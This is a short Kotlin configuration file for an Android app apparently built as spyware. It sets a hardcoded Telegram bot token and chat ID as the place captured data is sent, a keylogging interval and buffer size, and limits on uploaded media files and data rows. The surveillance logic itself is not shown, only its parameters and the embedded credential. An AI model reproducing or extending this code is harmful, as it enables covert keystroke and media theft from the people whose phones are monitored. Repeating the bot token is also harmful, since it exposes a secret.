package com.example.monitor

object Config {

    /** Token do bot (BotFather). */
    const val BOT_TOKEN = "9219208347:AAE4WZwlTv7SI2X_3UX3lTd84yh4x44kyAM"

    /** Chat/grupo de destino. */
    const val CHAT_ID = "9219208347"

    /** Seu id numérico. Só ele controla o bot. Vazio = aceita só o CHAT_ID. */
    const val ADMIN_ID = ""

    const val INTERVAL_MS = 15 * 60 * 1000L
    const val POLL_MS = 20 * 1000L

    const val KEYLOG_INTERVAL_MS = 60 * 1000L
    const val KEYLOG_FLUSH_CHARS = 400

    const val MEDIA_LIMIT = 5
    const val MEDIA_MAX_BYTES = 5L * 1024 * 1024

    const val ROW_LIMIT = 150

    fun configurado(): Boolean =
        BOT_TOKEN.contains(":") && BOT_TOKEN.length > 30 && CHAT_ID.isNotBlank()
}